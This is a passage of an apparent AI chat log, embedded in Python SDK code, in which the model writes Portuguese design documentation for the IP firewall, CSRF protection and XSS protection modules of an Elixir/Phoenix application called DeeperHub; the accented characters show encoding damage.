*   **Descri√ß√£o:** Adiciona um IP √† blocklist.
*   **`duration_seconds`:** `nil` para permanente, ou n√∫mero de segundos para bloqueio tempor√°rio.
*   **`metadata`:** Ex: `%{blocked_by: \"admin_user_id\", ticket_ref: \"SUP-123\"}`.
*   **Retorno:** Struct `IPBlock` salva ou erro.

### 6.4. `DeeperHub.Security.IPFirewallService.allow_ip(ip_address :: String.t(), reason :: String.t(), duration_seconds :: integer() | nil, metadata :: map() | nil) :: {:ok, IPAllow.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descri√ß√£o:** Adiciona um IP √† allowlist.
*   **Retorno:** Struct `IPAllow` salva ou erro.

### 6.5. `DeeperHub.Security.IPFirewallService.unblock_ip(ip_address :: String.t(), metadata :: map() | nil) :: :ok | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Remove um IP da blocklist (e do cache).
*   **`metadata`:** Ex: `%{unblocked_by: \"admin_user_id\"}`.

### 6.6. `DeeperHub.Security.IPFirewallService.disallow_ip(ip_address :: String.t(), metadata :: map() | nil) :: :ok | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Remove um IP da allowlist (e do cache).

### 6.7. `DeeperHub.Security.IPFirewallService.list_blocked_ips(opts :: keyword()) :: {:ok, list(IPBlock.t())}`

*   **Descri√ß√£o:** Lista IPs bloqueados (primariamente do banco de dados para gerenciamento).
*   **`opts`:** `:include_expired` (boolean), `:limit`, `:offset`.

### 6.8. `DeeperHub.Security.IPFirewallService.list_allowed_ips(opts :: keyword()) :: {:ok, list(IPAllow.t())}`

*   **Descri√ß√£o:** Lista IPs permitidos.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :ip_firewall, :enabled]`** (Boolean): Habilita/desabilita o firewall de IP. (Padr√£o: `true`)
*   **`[:security, :ip_firewall, :default_block_duration_seconds]`** (Integer): Dura√ß√£o padr√£o para bloqueios tempor√°rios. (Padr√£o: `3600` - 1 hora)
*   **`[:security, :ip_firewall, :default_allow_duration_seconds]`** (Integer): Dura√ß√£o padr√£o para permiss√µes tempor√°rias.
*   **`[:security, :ip_firewall, :permanent_blocked_ips]`** (List de Strings/CIDR): Lista de IPs/ranges permanentemente bloqueados carregados na inicializa√ß√£o.
*   **`[:security, :ip_firewall, :permanent_allowed_ips]`** (List de Strings/CIDR): Lista de IPs/ranges permanentemente permitidos.
*   **`[:security, :ip_firewall, :cache_load_on_startup]`** (Boolean): Se deve carregar as listas permanentes do DB para o cache ETS na inicializa√ß√£o. (Padr√£o: `true`)
*   **`[:security, :ip_firewall, :cleanup_interval_minutes]`** (Integer): Intervalo para o worker que remove entradas expiradas do *banco de dados* (o cache ETS lida com seus pr√≥prios TTLs). (Padr√£o: `1440` - 24 horas)
*   **`[:security, :ip_firewall, :plug, :mode]`** (Atom): Modo de opera√ß√£o do `IPFirewallPlug` (`:enforce` ou `:monitor`). (Padr√£o: `:enforce`)
*   **`[:security, :ip_firewall, :plug, :whitelist_paths]`** (List de Strings/Regex): Caminhos que devem ignorar a verifica√ß√£o do firewall.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Security.Cache.SecurityCache`: Para caching de IPs.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter pol√≠ticas.
*   `DeeperHub.Audit`: Para registrar altera√ß√µes.
*   `DeeperHub.Shared.Utils.ValidationUtils` (ou similar): Para validar formatos de IP/CIDR.

### 8.2. Bibliotecas Externas

*   `Ecto`: Para persist√™ncia de regras permanentes.
*   Pode usar bibliotecas para manipula√ß√£o de CIDR se n√£o for feito manualmente.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Plug no Pipeline Phoenix:**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :api do
      plug DeeperHub.Security.Plugs.IPFirewallPlug, mode: :enforce # ou :monitor
      # ... outros plugs ...
    end
    ```
*   **Verifica√ß√£o Program√°tica:**
    ```elixir
    if DeeperHub.Security.IPFirewallService.is_blocked?(client_ip) do
      # L√≥gica para lidar com IP bloqueado
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar bloqueio e permiss√£o de IPs/CIDRs (tempor√°rios e permanentes).
*   Testar a l√≥gica de expira√ß√£o de entradas no cache e (se aplic√°vel) no DB.
*   Testar a preced√™ncia (allowlist > blocklist).
*   Testar o `IPFirewallPlug` em modo `:enforce` e `:monitor`.
*   Testar a carga de listas iniciais.
*   Localiza√ß√£o: `test/deeper_hub/security/ip_firewall_service/`.

### 10.2. M√©tricas

*   `deeper_hub.security.ip_firewall.requests_checked.count`
*   `deeper_hub.security.ip_firewall.requests_blocked.count` (tags: `reason`)
*   `deeper_hub.security.ip_firewall.requests_allowed_by_whitelist.count`
*   `deeper_hub.security.ip_firewall.blocked_ips.gauge` (Gauge): N√∫mero de IPs atualmente na blocklist (cache).
*   `deeper_hub.security.ip_firewall.allowed_ips.gauge` (Gauge): N√∫mero de IPs atualmente na allowlist (cache).
*   `deeper_hub.security.ip_firewall.db_cleanup.items_removed.count`

### 10.3. Logs

*   **N√≠vel INFO:** IP adicionado/removido da allowlist/blocklist (com motivo e quem fez).
*   **N√≠vel WARNING:** Requisi√ß√£o bloqueada pelo firewall (com IP e path).
*   **N√≠vel ERROR:** Falha ao persistir/remover regra no banco de dados. Erro ao carregar listas iniciais.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ip_firewall, :ip_check]`
    *   Metadados: `%{ip_address: ip, result: :allowed | :blocked | :whitelisted, path: path}`
*   `[:deeper_hub, :security, :ip_firewall, :list_modified]`
    *   Metadados: `%{list_type: :blocklist | :allowlist, action: :added | :removed, ip_address: ip, reason: reason, duration_seconds: dur, admin_id: id}`

## ‚ùå 11. Tratamento de Erros

*   **Falha no Cache:** Se o `SecurityCache` estiver indispon√≠vel, o servi√ßo pode tentar consultar o banco de dados diretamente para regras permanentes, mas isso ter√° impacto na performance. Deve logar criticamente.
*   **Falha no Banco de Dados:** Falhas ao persistir regras permanentes devem ser logadas e, possivelmente, tentar novamente. A opera√ß√£o no cache pode ser feita de forma otimista.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Autoriza√ß√£o para Modificar Listas:** As fun√ß√µes `block_ip`, `allow_ip`, etc., devem ser protegidas e s√≥ acess√≠veis por administradores ou sistemas automatizados autorizados (ex: IDS).
*   **Preven√ß√£o de Auto-Bloqueio:** Cuidado para n√£o bloquear IPs de sistemas essenciais ou de administradores, a menos que intencional. A allowlist pode ajudar aqui.
*   **Tamanho das Listas:** Listas de bloqueio/permiss√£o muito grandes podem impactar a performance da inicializa√ß√£o e do cache, mesmo com ETS. Considere limites ou estrat√©gias de pagina√ß√£o para gerenciamento.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novas fontes de IPs para bloqueio/permiss√£o (ex: feeds de threat intelligence), integre-as de forma que atualizem o `IPFirewallService`.
*   Garanta que os motivos para bloqueio/permiss√£o sejam claros e audit√°veis.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Suporte para regras de firewall mais complexas (ex: por pa√≠s, ASN, n√£o apenas IP). Isso come√ßaria a sobrepor com WAFs.
*   [ ] Integra√ß√£o com feeds de reputa√ß√£o de IP externos para popular dinamicamente a blocklist.
*   [ ] UI administrativa para gerenciamento f√°cil das listas de IP.
*   [ ] Permitir que as pol√≠ticas de `SecurityPolicyManager` definam diferentes perfis de firewall (ex: \"agressivo\", \"moderado\") que ajustam automaticamente dura√ß√µes e limiares.
*   [ ] Adicionar um modo \"monitor\" mais granular, que loga o que *seria* bloqueado mas ainda permite a requisi√ß√£o (al√©m do plug global).

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Este cobre o Firewall de IP! Agora, o `DeeperHub.Security.Policy.SecurityPolicyManager` que acabamos de referenciar bastante seria um bom pr√≥ximo passo para ver como essas configura√ß√µes s√£o gerenciadas, ou prefere focar em outro aspecto da seguran√ßa como `DDoSProtection` ou `CSRFProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, j√° detalhamos o `DeeperHub.Security.Policy.SecurityPolicyManager`.

Dado que j√° cobrimos v√°rios componentes de seguran√ßa importantes (`FraudDetection`, `BruteForceProtection`, `IPFirewallService`, `DeviceFingerprint`, `GeoLocationService`, `BehavioralAnalysis`, `RiskAssessment`, `SecurityPolicyManager`), podemos agora focar em outras camadas de prote√ß√£o que s√£o comuns em aplica√ß√µes web.

Vamos detalhar o `DeeperHub.Security.CsrfProtection`.

---

# M√≥dulo: `DeeperHub.Security.CsrfProtection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.CsrfProtection`

O m√≥dulo `DeeperHub.Security.CsrfProtection` √© respons√°vel por proteger a aplica√ß√£o DeeperHub contra ataques de **Cross-Site Request Forgery (CSRF)**. Um ataque CSRF ocorre quando um site malicioso, email, blog, mensagem instant√¢nea ou programa faz com que o navegador de um usu√°rio autenticado realize uma a√ß√£o indesejada em um site confi√°vel.

Para mitigar isso, este m√≥dulo implementa o padr√£o de **token sincronizador (Synchronizer Token Pattern)**. Ele gera tokens √∫nicos e imprevis√≠veis por sess√£o que s√£o embutidos em formul√°rios e verificados em requisi√ß√µes que modificam o estado (POST, PUT, DELETE, PATCH), garantindo que a requisi√ß√£o se originou da pr√≥pria aplica√ß√£o e n√£o de uma fonte externa maliciosa. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gera√ß√£o de Tokens CSRF (`generate_token/2`):**
    *   Gerar tokens CSRF √∫nicos, seguros e espec√≠ficos para cada sess√£o de usu√°rio.
    *   Os tokens devem ser suficientemente aleat√≥rios e dif√≠ceis de adivinhar.
    *   Associar tokens a um contexto opcional (ex: nome do formul√°rio) para maior seguran√ßa (double submit cookie com token no corpo/header).
*   **Armazenamento e Gerenciamento de Tokens:**
    *   Armazenar o token CSRF esperado de forma segura, tipicamente na sess√£o do usu√°rio ou em um cookie seguro (HttpOnly, SameSite).
    *   Gerenciar o ciclo de vida dos tokens, incluindo expira√ß√£o (opcional, mas recomendado) e invalida√ß√£o.
*   **Valida√ß√£o de Tokens CSRF (`validate_token/3`):**
    *   Verificar se o token CSRF enviado em uma requisi√ß√£o (ex: em um header `X-CSRF-Token` ou campo de formul√°rio `_csrf_token`) corresponde ao token esperado para a sess√£o do usu√°rio.
    *   Rejeitar a requisi√ß√£o se o token estiver ausente, for inv√°lido ou n√£o corresponder.
*   **Integra√ß√£o com a Aplica√ß√£o Web (Plugs):**
    *   Fornecer um Plug Phoenix (ex: `CsrfProtectionPlug`) para automatizar a gera√ß√£o e verifica√ß√£o de tokens para rotas relevantes.
    *   Facilitar a inclus√£o de tokens em formul√°rios HTML (ex: `form_field/2`).
    *   Fornecer tokens para serem inclu√≠dos em cabe√ßalhos de requisi√ß√µes AJAX por aplica√ß√µes frontend (ex: `security_headers/2`).
*   **Configurabilidade:**
    *   Permitir a configura√ß√£o do nome do cookie/header/campo de formul√°rio para o token.
    *   Configurar o tempo de vida dos tokens.
    *   Definir quais m√©todos HTTP requerem verifica√ß√£o CSRF (geralmente todos exceto GET, HEAD, OPTIONS, TRACE).
*   **Invalida√ß√£o de Tokens:**
    *   Invalidar tokens CSRF ap√≥s o uso (para tokens de uso √∫nico, se aplic√°vel) ou quando a sess√£o do usu√°rio √© encerrada (`invalidate_tokens/1`).
*   **Observabilidade:**
    *   Registrar m√©tricas sobre tokens gerados, validados, falhas de valida√ß√£o.
    *   Logar tentativas de CSRF bloqueadas.
*   **Auditoria:**
    *   Registrar eventos de falha na valida√ß√£o de CSRF no sistema de auditoria.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.CsrfProtection` (Fachada P√∫blica):**
    *   Ponto de entrada para as funcionalidades de CSRF.
    *   Delega para o `CsrfProtectionService`.
2.  **`DeeperHub.Security.CsrfProtection.Services.CsrfProtectionService` (GenServer ou M√≥dulo Funcional):**
    *   **Responsabilidade:** L√≥gica principal para gera√ß√£o, armazenamento (se n√£o for puramente na sess√£o do cliente/cookie) e valida√ß√£o de tokens.
    *   **Estado (se GenServer, para tokens stateful ou estat√≠sticas):** Pode manter um registro de tokens emitidos recentemente ou estat√≠sticas de valida√ß√£o, embora o padr√£o mais comum seja stateless no backend e o token esperado seja armazenado na sess√£o do usu√°rio.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Auth.SessionManager` ou `Plug.Session`: Para obter/definir o token CSRF esperado na sess√£o do usu√°rio.
        *   `DeeperHub.Shared.Utils.SecurityUtils`: Para gerar bytes aleat√≥rios seguros para os tokens.
        *   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes (nome do cookie, TTL, etc.).
3.  **`DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug` (Phoenix Plug):**
    *   **Responsabilidade:** Middleware para ser adicionado aos pipelines do Phoenix Router.
    *   **No fluxo de entrada:** Para requisi√ß√µes que modificam estado (POST, PUT, etc.), extrai o token da requisi√ß√£o (header ou corpo) e o valida contra o token na sess√£o. Se inv√°lido, rejeita a requisi√ß√£o (ex: retorna 403).
    *   **No fluxo de sa√≠da (opcional, para garantir que o token esteja sempre dispon√≠vel):** Pode garantir que um token CSRF seja gerado e enviado ao cliente (ex: em um cookie) se ainda n√£o existir na sess√£o.
4.  **Fun√ß√µes Helper (em `CsrfProtection` ou em um m√≥dulo de views/templates):**
    *   `form_field/2`: Para gerar o campo `<input type=\"hidden\">` em formul√°rios HTML.
    *   `security_headers/2`: Para fornecer o token a ser inclu√≠do em headers por clientes JavaScript.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/csrf_protection/
‚îú‚îÄ‚îÄ csrf_protection.ex                # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ csrf_protection_service.ex    # L√≥gica principal de gera√ß√£o/valida√ß√£o
‚îÇ
‚îú‚îÄ‚îÄ plug/                             # (Pode estar em deeper_hub_web/plugs se usando Phoenix)
‚îÇ   ‚îî‚îÄ‚îÄ csrf_protection_plug.ex
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                     # Supervisor (se CsrfProtectionService for GenServer)
```
*(Os m√≥dulos `CsrfProtectionAdapter` e `CsrfProtectionBehaviour` da documenta√ß√£o original podem ser simplificados se o `CsrfProtectionService` for a implementa√ß√£o principal e a fachada o chamar diretamente.)*

### 3.3. Decis√µes de Design Importantes

*   **Padr√£o de Token Sincronizador:** O design mais comum e recomendado √© usar o padr√£o de token sincronizador.
    1.  Na primeira resposta ao cliente (ou quando a sess√£o √© criada), gerar um token CSRF secreto.
    2.  Armazenar este token secreto em um cookie seguro (HttpOnly, SameSite=Lax ou Strict) OU na sess√£o do servidor.
    3.  Para cada formul√°rio ou requisi√ß√£o AJAX que modifica estado, embutir um token CSRF (que pode ser o mesmo token secreto ou um derivado dele, como um HMAC do token secreto + ID da sess√£o).
    4.  No servidor, para cada requisi√ß√£o que modifica estado:
        *   Se o token secreto est√° no cookie: comparar o token do cookie com o token enviado no corpo/header.
        *   Se o token secreto est√° na sess√£o do servidor: comparar o token da sess√£o do servidor com o token enviado no corpo/header.
*   **Stateless vs. Stateful Tokens CSRF no Backend:**
    *   **Stateless (Double Submit Cookie):** O servidor n√£o precisa armazenar o token CSRF. Ele envia um token em um cookie e espera o mesmo token de volta no corpo/header da requisi√ß√£o. F√°cil de escalar.
    *   **Stateful (Token na Sess√£o):** O servidor armazena o token CSRF esperado na sess√£o do usu√°rio no backend. Mais seguro contra algumas vulnerabilidades de subdom√≠nio, mas requer gerenciamento de sess√£o no backend.
    *   Para DeeperHub, que j√° tem um `SessionManager`, armazenar o token CSRF esperado na sess√£o do servidor parece uma abordagem robusta.
*   **Tokens por Requisi√ß√£o vs. Por Sess√£o:**
    *   **Por Sess√£o (mais comum):** Um token CSRF √© gerado por sess√£o e √© v√°lido para m√∫ltiplas requisi√ß√µes dentro dessa sess√£o.
    *   **Por Requisi√ß√£o (mais seguro, mas mais complexo):** Um novo token √© gerado para cada formul√°rio/requisi√ß√£o. Aumenta a complexidade no cliente.
    *   Recomenda-se iniciar com tokens por sess√£o.
*   **Valida√ß√£o para M√©todos Seguros:** A prote√ß√£o CSRF √© crucial para m√©todos HTTP que alteram estado (`POST`, `PUT`, `DELETE`, `PATCH`). M√©todos seguros (`GET`, `HEAD`, `OPTIONS`, `TRACE`) geralmente n√£o precisam de prote√ß√£o CSRF, pois n√£o devem ter efeitos colaterais.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Submete um Formul√°rio Web:**
    *   Ao renderizar o formul√°rio, `CsrfProtection.form_field/2` √© usado para embutir o token CSRF.
    *   Quando o usu√°rio submete o formul√°rio (POST), o token √© inclu√≠do.
    *   O `CsrfProtectionPlug` intercepta a requisi√ß√£o, extrai o token do formul√°rio e o token da sess√£o, e os compara. Se forem iguais, a requisi√ß√£o prossegue. Sen√£o, √© bloqueada.
*   **Aplica√ß√£o Frontend (SPA) Envia Requisi√ß√£o AJAX:**
    *   Ao carregar a SPA, o cliente pode solicitar o token CSRF atual (ex: de um endpoint `/api/v1/csrf-token` ou o token √© fornecido em um meta tag/cookie n√£o-HttpOnly).
    *   Para cada requisi√ß√£o `POST`, `PUT`, `DELETE`, a SPA inclui o token em um header customizado (ex: `X-CSRF-Token`).
    *   O `CsrfProtectionPlug` no backend verifica este header contra o token na sess√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Prote√ß√£o CSRF para Requisi√ß√£o POST (com token na sess√£o)

1.  **Cliente (Navegador):**
    *   Usu√°rio acessa uma p√°gina com um formul√°rio.
    *   O servidor, ao renderizar a p√°gina, garante que um token CSRF (`expected_csrf_token`) est√° na sess√£o do usu√°rio e tamb√©m insere este token (ou um derivado) como um campo oculto no formul√°rio.
2.  **Submiss√£o do Formul√°rio:** Usu√°rio submete o formul√°rio (requisi√ß√£o POST). O navegador envia os cookies da sess√£o (que podem conter o `expected_csrf_token` se voc√™ usar a t√©cnica de cookie tamb√©m) e os dados do formul√°rio (que incluem o `submitted_csrf_token`).
3.  **`DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug` (Backend):**
    *   Intercepta a requisi√ß√£o POST.
    *   Extrai o `expected_csrf_token` da sess√£o do usu√°rio (via `SessionManager`).
    *   Extrai o `submitted_csrf_token` do corpo do formul√°rio (ou de um header `X-CSRF-Token` para AJAX).
    *   **Valida√ß√£o:** Compara `expected_csrf_token` com `submitted_csrf_token`.
        *   **Match:** A requisi√ß√£o √© considerada leg√≠tima e prossegue para o controller. Opcionalmente, um novo token CSRF pode ser gerado e atualizado na sess√£o para a pr√≥xima requisi√ß√£o (para tokens de uso √∫nico ou rotacionados).
        *   **Mismatch ou Ausente:** A requisi√ß√£o √© considerada uma poss√≠vel tentativa de CSRF. O plug retorna uma resposta de erro (ex: 403 Forbidden) e interrompe o processamento. Um log de seguran√ßa/auditoria √© gerado.
4.  **Controller (se a valida√ß√£o CSRF passar):** Processa a requisi√ß√£o normalmente.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.CsrfProtection.generate_token(session_id :: String.t(), context :: map() | nil) :: {:ok, String.t()} | {:error, term()}`

*   **Descri√ß√£o:** Gera (ou recupera da sess√£o) um token CSRF para a sess√£o especificada. Se um token j√° existir na sess√£o e for v√°lido, pode retorn√°-lo. Caso contr√°rio, gera um novo, o armazena na sess√£o e o retorna.
*   **`context`:** Pode ser usado para gerar tokens espec√≠ficos para diferentes formul√°rios/a√ß√µes, embora um token por sess√£o seja mais comum.
*   **Retorno:** O token CSRF como string.

### 6.2. `DeeperHub.Security.CsrfProtection.validate_token(session_id :: String.t(), submitted_token :: String.t(), context :: map() | nil) :: :ok | :error`

*   **Descri√ß√£o:** Valida um token CSRF submetido contra o esperado para a sess√£o.
*   **Retorno:** `:ok` se v√°lido, `:error` (ou `{:error, :invalid_token}`) se inv√°lido.

### 6.3. `DeeperHub.Security.CsrfProtection.form_field(session_id :: String.t(), opts :: keyword()) :: {:ok, String.t()}`

*   **Descri√ß√£o:** Gera a string HTML para um campo de formul√°rio oculto contendo o token CSRF.
*   **`opts`:** `:field_name` (Nome do campo, padr√£o: `\"_csrf_token\"`).
*   **Exemplo de Retorno:** `{:ok, \"<input type=\\\"hidden\\\" name=\\\"_csrf_token\\\" value=\\\"random_token_string\\\" />\"}`

### 6.4. `DeeperHub.Security.CsrfProtection.get_token_for_header(session_id :: String.t()) :: {:ok, String.t()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Obt√©m o token CSRF atual para ser usado em um cabe√ßalho HTTP (ex: `X-CSRF-Token`) por clientes AJAX. Similar a `generate_token/2` mas com a inten√ß√£o clara de uso em header.

### 6.5. `DeeperHub.Security.CsrfProtection.invalidate_tokens(session_id :: String.t()) :: :ok`

*   **Descri√ß√£o:** Invalida/remove o token CSRF da sess√£o do usu√°rio (ex: no logout).

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :csrf_protection, :enabled]`** (Boolean): Habilita/desabilita a prote√ß√£o CSRF. (Padr√£o: `true`)
*   **`[:security, :csrf_protection, :token_name_in_session]`** (String): Chave usada para armazenar o token CSRF na sess√£o do servidor. (Padr√£o: `\"_csrf_token_secret\"`)
*   **`[:security, :csrf_protection, :form_field_name]`** (String): Nome do campo de formul√°rio esperado. (Padr√£o: `\"_csrf_token\"`)
*   **`[:security, :csrf_protection, :header_name]`** (String): Nome do cabe√ßalho HTTP esperado. (Padr√£o: `\"X-CSRF-Token\"`)
*   **`[:security, :csrf_protection, :methods_to_protect]`** (List de Strings): M√©todos HTTP que requerem valida√ß√£o CSRF. (Padr√£o: `[\"POST\", \"PUT\", \"DELETE\", \"PATCH\"]`)
*   **`[:security, :csrf_protection, :token_lifespan_seconds]`** (Integer | `:session`): Tempo de vida do token CSRF. Se `:session`, vive enquanto a sess√£o do usu√°rio viver. (Padr√£o: `:session`)
*   **`[:security, :csrf_protection, :rotate_token_on_get]`** (Boolean): Se um novo token deve ser gerado e retornado em requisi√ß√µes GET (para SPAs que precisam de um token fresco). (Padr√£o: `false`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logging de falhas.
*   `DeeperHub.Core.Metrics`: Para m√©tricas de CSRF.
*   `DeeperHub.Auth.SessionManager` (ou `Plug.Session`): Para armazenar/recuperar o token CSRF esperado da sess√£o do usu√°rio.
*   `DeeperHub.Shared.Utils.SecurityUtils`: Para gera√ß√£o de tokens aleat√≥rios seguros.
*   `DeeperHub.Audit`: Para registrar tentativas de CSRF bloqueadas.

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica, mas depende do mecanismo de sess√£o usado (ex: `Plug.Session`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Com Phoenix:** Adicionar `DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug` ao pipeline de rotas que manipulam o estado (tipicamente o pipeline `:browser` se houver formul√°rios web, ou um pipeline `:api_session_protected` para SPAs que usam sess√µes).
    ```elixir
    # lib/deeper_hub_web/router.ex
    pipeline :browser_csrf do
      plug :accepts, [\"html\"]
      plug :fetch_session
      plug :fetch_live_flash
      plug DeeperHub.Security.CsrfProtection.Plug.CsrfProtectionPlug # Adicionar aqui
      plug :protect_from_forgery # Plug padr√£o do Phoenix, pode ser redundante ou complementar
    end

    scope \"/\", DeeperHubWeb do
      pipe_through [:browser, :browser_csrf] # Aplicar ao escopo apropriado
      # ... rotas ...
    end
    ```
*   **Em Formul√°rios HTML (Phoenix):**
    ```eex
    <%= form_for @changeset, @action, fn f -> %>
      <%= DeeperHub.Security.CsrfProtection.form_field_tag(conn) %> # Helper para o plug padr√£o do Phoenix
      <%# Ou se usando a API diretamente: %>
      <%# {:ok, csrf_input} = DeeperHub.Security.CsrfProtection.form_field(conn.assigns.session_id) %>
      <%# <%= raw csrf_input %> 
      ...
    <% end %>
    ```
*   **Em Clientes JavaScript (SPAs):**
    1.  Obter o token CSRF do backend (ex: de um endpoint `/api/csrf-token` ou de um cookie n√£o-HttpOnly se a pol√≠tica SameSite permitir).
    2.  Incluir o token em um header customizado (ex: `X-CSRF-Token`) para todas as requisi√ß√µes AJAX que modificam estado.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se requisi√ß√µes POST/PUT/DELETE sem token CSRF s√£o bloqueadas.
*   Testar se requisi√ß√µes com token CSRF inv√°lido/incorreto s√£o bloqueadas.
*   Testar se requisi√ß√µes com token CSRF v√°lido s√£o permitidas.
*   Testar a gera√ß√£o e invalida√ß√£o de tokens.
*   Testar o funcionamento do `CsrfProtectionPlug`.
*   Localiza√ß√£o: `test/deeper_hub/security/csrf_protection/`.

### 10.2. M√©tricas

*   `deeper_hub.security.csrf.tokens_generated.count`
*   `deeper_hub.security.csrf.validation.success.count`
*   `deeper_hub.security.csrf.validation.failure.count` (tags: `reason` (`missing_token`, `invalid_token`))
*   `deeper_hub.security.csrf.requests_blocked.count`

### 10.3. Logs

*   **N√≠vel WARNING:** Falha na valida√ß√£o do token CSRF, requisi√ß√£o bloqueada.
*   **N√≠vel INFO:** Token CSRF gerado para nova sess√£o (se relevante).

### 10.4. Telemetria

*   `[:deeper_hub, :security, :csrf, :validation, :start | :stop | :exception]`
    *   Metadados: `%{path: path, method: method, session_id_present: boolean, token_source: :header | :form | :missing}`
    *   No `:stop`: `%{result: :valid | :invalid | :missing}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na valida√ß√£o CSRF devem resultar em uma resposta de erro clara para o cliente (ex: 403 Forbidden) e a requisi√ß√£o n√£o deve ser processada.
*   Erros na gera√ß√£o ou armazenamento do token na sess√£o devem ser logados criticamente, pois podem comprometer a prote√ß√£o.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **For√ßa do Token:** Os tokens CSRF devem ser gerados usando uma fonte de aleatoriedade criptograficamente segura e ter entropia suficiente.
*   **Armazenamento Seguro do Token Esperado:** Se armazenado na sess√£o do servidor, a seguran√ßa do mecanismo de sess√£o √© crucial. Se usando o padr√£o double-submit cookie, o cookie que armazena o token deve ser HttpOnly (se poss√≠vel, embora isso impe√ßa o JS de l√™-lo para AJAX) e SameSite.
*   **HTTPS:** Sempre usar HTTPS para proteger os tokens CSRF em tr√¢nsito.
*   **N√£o Vazar Tokens:** Tokens CSRF n√£o devem ser expostos em URLs ou logs.
*   **Verifica√ß√£o de `Origin` e `Referer` Headers:** Como uma camada adicional de defesa, verificar esses headers pode ajudar, mas eles n√£o s√£o totalmente confi√°veis e n√£o substituem os tokens CSRF.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Garantir que o `CsrfProtectionPlug` seja aplicado a todas as rotas relevantes que modificam estado.
*   Assegurar que todos os formul√°rios e chamadas AJAX que modificam estado incluam o token CSRF.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar rota√ß√£o autom√°tica de tokens CSRF ap√≥s um certo n√∫mero de requisi√ß√µes ou tempo, mesmo dentro da mesma sess√£o, para maior seguran√ßa.
*   [ ] Adicionar suporte para tokens CSRF espec√≠ficos por formul√°rio/a√ß√£o (aumenta a complexidade, mas tamb√©m a seguran√ßa).
*   [ ] Investigar o uso de cabe√ßalhos como `Sec-Fetch-Site` como um indicador adicional na valida√ß√£o CSRF (para navegadores que suportam).
*   [ ] Fornecer helpers mais robustos para integra√ß√£o com frameworks frontend JavaScript populares.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Prote√ß√£o CSRF √© essencial para aplica√ß√µes web!

O pr√≥ximo poderia ser `DeeperHub.Security.XssProtection` para continuarmos com as defesas contra ataques web comuns, ou prefere outro?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos agora detalhar o `DeeperHub.Security.XssProtection`, que √© fundamental para proteger os usu√°rios contra ataques de Cross-Site Scripting.

---

# M√≥dulo: `DeeperHub.Security.XssProtection` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.XssProtection`

O m√≥dulo `DeeperHub.Security.XssProtection` √© dedicado a prevenir ataques de **Cross-Site Scripting (XSS)** no sistema DeeperHub. XSS √© uma vulnerabilidade que permite a um invasor injetar scripts maliciosos (geralmente JavaScript) em p√°ginas web visualizadas por outros usu√°rios. Esses scripts podem ent√£o roubar informa√ß√µes da sess√£o do usu√°rio, desfigurar sites, redirecionar usu√°rios para sites maliciosos, ou realizar outras a√ß√µes em nome do usu√°rio.

Este m√≥dulo foca em duas estrat√©gias principais:
1.  **Sanitiza√ß√£o de Entrada:** Limpar dados fornecidos pelo usu√°rio antes que sejam armazenados ou processados, se eles forem destinados a serem exibidos como HTML.
2.  **Codifica√ß√£o de Sa√≠da (Output Encoding/Escaping):** Garantir que quaisquer dados din√¢micos inseridos em p√°ginas HTML sejam devidamente \"escapados\" para que o navegador os interprete como texto literal e n√£o como c√≥digo execut√°vel.
